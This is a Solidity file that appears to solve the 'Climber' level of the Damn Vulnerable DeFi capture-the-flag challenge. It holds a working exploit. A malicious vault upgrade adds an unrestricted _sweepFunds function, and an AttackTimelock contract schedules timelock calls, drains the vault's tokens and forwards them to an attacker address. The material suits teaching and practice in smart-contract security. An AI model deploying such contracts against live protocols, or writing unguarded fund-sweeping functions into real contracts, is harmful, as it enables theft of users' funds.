// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../DamnValuableToken.sol";

import "../climber/ClimberTimelock.sol";
import "../climber/ClimberVault.sol";


contract ClimberVaultV2 is ClimberVault {

    /**
    *@dev
    *In our upgraded ClimberVault, we add this function _sweepFunds(), which differs from sweepFunds() in that it does not have the onlySweeper modifier anymore:
    *    -> anyone can call it and send the vault tokens balance to any address.

    */
    function _sweepFunds(address tokenAddress, address _owner) external {
        IERC20 token = IERC20(tokenAddress);
        require(token.transfer(_owner, token.balanceOf(address(this))), "Transfer failed");
    }
}


contract AttackTimelock {

    ClimberVaultV2 vault;
    ClimberTimelock public timelock;
    DamnValuableToken public dvt;

    address owner;

    bytes[] private scheduleData;
    address[] private to;

    constructor(address _vault, address payable _timelock, address _dvt, address _owner) {
        vault = ClimberVaultV2(_vault);
        timelock = ClimberTimelock(_timelock);
        dvt = DamnValuableToken(_dvt);
        owner = _owner;
    }

    function setCallData(address[] memory _to, bytes[] memory _data) external {
        to = _to;
        scheduleData = _data;
    }

    function attack() external {
        uint256[] memory emptyData = new uint256[](to.length);
        timelock.schedule(to, emptyData, scheduleData, 0);

        vault._sweepFunds(address(dvt),address(this));
    }

    function withdrawToAttacker() external {
        dvt.transfer(owner, dvt.balanceOf(address(this)));
    }
}